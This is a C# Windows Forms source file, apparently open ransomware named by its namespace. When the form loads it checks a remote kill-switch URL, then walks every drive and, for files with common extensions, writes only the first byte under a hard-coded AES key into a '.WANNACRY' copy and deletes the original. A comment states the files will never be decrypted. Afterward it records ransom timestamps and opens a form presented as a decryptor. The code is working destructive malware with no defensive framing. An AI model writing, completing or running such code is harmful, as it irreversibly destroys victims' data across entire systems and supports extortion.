using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Ransomware
{
    public partial class Form1 : Form
    {
        string KILLSWITCH_Url = "ENTER_URL_HERE";

        string[] FileExtensions = {
            ".jpeg", ".png", ".jpg", ".gif",   // Images
            ".mov", ".mp4",  // Videos
            ".aae", ".bin", ".csv", ".dat", ".key", ".mpp", ".obb", ".ppt", ".pptx", ".rpt", ".sdf", ".tar", ".vcf", ".xml", ".zip", ".torrent",  // Data
            ".doc", ".docx", ".eml", ".log", ".msg", ".odt", ".pages", ".rtf", ".tex", ".txt", ".wpd",  // Text
            ".accdb", ".crypt14", ".db", ".mdb", ".odb", ".pdb", ".sql", ".sqlite",  // Database
            ".apk", ".app", ".bat", ".bin", ".cmd", ".com", ".exe", ".ipa", ".jar", ".run", ".sh",  // Executables
            ".appx", ".c", ".class", ".cpp", ".cs", ".h", ".java", ".kt", ".m", ".lua", ".md", ".pl", ".py", ".sb3", ".sln", ".swift", ".unity", ".vb", ".vcxproj", ".xcodeproj", ".yml",    // Developer Files
            ".abk", ".arc", ".bak", ".tmp" // Backup Files
        };
        string[] Excluded_Folders = { "Program Files (x86)", "Program Files", "Windows" , "$RECYCLE.BIN" , "$WinREAgent" , "ProgramData"};

        public Form1()
        {
            InitializeComponent();
        }

        public static void EncryptFile(string inputFile, string outputFile, string skey)
        {
            try
            {
                using (RijndaelManaged aes = new RijndaelManaged())
                {
                    byte[] key = ASCIIEncoding.UTF8.GetBytes(skey);
                    byte[] IV = ASCIIEncoding.UTF8.GetBytes(skey);
                    using (FileStream fsCrypt = new FileStream(outputFile, FileMode.Create))
                    {
                        using (ICryptoTransform encryptor = aes.CreateEncryptor(key, IV))
                        {
                            using (CryptoStream cs = new CryptoStream(fsCrypt, encryptor, CryptoStreamMode.Write))
                            {
                                using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
                                {
                                    // Only encrypt the first byte for faster speeds, since the files will never get decrypted anyways
                                    int data;
                                    for (int i = 0; i < 1; i++)
                                    {
                                        data = fsIn.ReadByte();
                                        cs.WriteByte((byte)data);
                                    }
                                }
                            }
                        }
                    }
                }

                if (File.Exists(inputFile))
                    File.Delete(inputFile);

            }catch (Exception ex){ }
        }

        public void DirSearch(string sDir)
        {
            try
            {
                bool bb = Excluded_Folders.Any(sDir.Contains);

                if (!bb)
                {
                    foreach (string f in Directory.GetFiles(sDir))
                    {
                        bool bbb = FileExtensions.Any(f.Contains);
                        if (bbb)
                        {
                            string path = f + ".WANNACRY";
                            EncryptFile(f, path, "HAIROAHSJURNCBYE"); // HAIROAHSJURNCBYE = Key file gets encrypted with (just add a function to generate a random string of 16 characters if you wish)
                        }
                    }
                    foreach (string d in Directory.GetDirectories(sDir))
                    {
                        bool b = Excluded_Folders.Any(d.Contains);

                        if (!b) {
                            DirSearch(d);
                        }
                    }
                }
            }
            catch(Exception ex) { }
        }

        async void Check_KillSwitch()
        {
            try
            {
                HttpClient Client = new HttpClient();
                var result = await Client.GetAsync(KILLSWITCH_Url);
                Environment.Exit(0);
            }catch(Exception ex) { }
        }

        public void Form1_Load(object sender, EventArgs e)
        {
            Check_KillSwitch(); // Checks if website is online if so the ransomare will not execute (a remote kill switch)

            // Get all drives on the system
            DriveInfo[] driverslist = DriveInfo.GetDrives();
            foreach (DriveInfo d in driverslist)
            {
                DirSearch(d.Name); // Encrypt the drive
            }

            // Testing
            // DirSearch(@"C:\Users\PC\Desktop\Testing Ransomware");

            Properties.Settings.Default["Date_And_Time_Of_Ransom"] = DateTime.Now.ToString("dd/MM/yyyy hh:mm:ss").ToString();
            Properties.Settings.Default["Time_Of_Ransom"] = DateTime.Now.ToString("hh:mm:ss").ToString();
            Properties.Settings.Default["Date_Of_Ransom"] = DateTime.Now.ToString("dd/MM/yyyy").ToString();
            Properties.Settings.Default.Save();

            // Close this form and open the decryptor
            this.Hide();
            Form2 form = new Form2();
            form.Show();
        }
    }
}
